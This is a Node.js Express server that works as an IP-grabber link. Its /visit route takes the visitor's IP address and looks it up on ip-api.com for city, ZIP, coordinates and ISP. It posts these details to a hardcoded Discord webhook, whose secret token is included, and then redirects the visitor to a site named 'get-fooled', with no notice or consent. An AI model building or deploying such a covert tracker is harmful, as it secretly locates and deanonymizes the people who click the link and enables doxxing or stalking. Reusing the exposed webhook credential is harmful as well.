const express = require("express");
const fetch = require("node-fetch");
const path = require("path");

const app = express();
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1405976093189607566/GFPsq97ZkBM9VD2OjZpq1Pzs2IDRTLsPsxcmHmIaEDnZic5w25ZvkQrGz7lf91Ub_roX";

// Serve static files from /public
app.use(express.static(path.join(__dirname, "public")));

// Tracking route
app.get("/visit", async (req, res) => {
    // Get real visitor IP
    let ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || req.connection.remoteAddress;

    if (ip.includes(",")) ip = ip.split(",")[0].trim();
    if (ip.startsWith("::ffff:")) ip = ip.replace("::ffff:", "");

    console.log("Visitor IP:", ip);

    try {
        // Get geo data from ip-api.com
        const geoResponse = await fetch(`http://ip-api.com/json/${ip}?fields=query,status,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname`);
        const geoData = await geoResponse.json();
        console.log("Geo data:", geoData);

        // Send to Discord
        const payload = {
            content: `📢 New visitor detected!
🌐 IP: ${geoData.query}
✅ Status: ${geoData.status}
🌍 Continent: ${geoData.continent} (${geoData.continentCode})
🇨🇳 Country: ${geoData.country} (${geoData.countryCode})
🏙 Region/City: ${geoData.regionName}, ${geoData.city}
📍 District/ZIP: ${geoData.district}, ${geoData.zip}
🗺 Coordinates: ${geoData.lat}, ${geoData.lon}
⏱ Timezone/Offset: ${geoData.timezone}, ${geoData.offset}
💰 Currency: ${geoData.currency}
💻 ISP/Org: ${geoData.isp}, ${geoData.org}
🆔 AS/ASName: ${geoData.as}, ${geoData.asname}`
        };

        const discordResponse = await fetch(DISCORD_WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });
        console.log("Discord response status:", discordResponse.status);

        // Redirect to your public website
        res.redirect("https://get-fooled.onrender.com");
    } catch (err) {
        console.error("Error sending to Discord:", err);
        res.sendStatus(500);
    }
});

// Use Render's port and bind to 0.0.0.0
const PORT = process.env.PORT || 3000;
app.listen(PORT, "0.0.0.0", () => console.log(`Server running on port ${PORT}`));
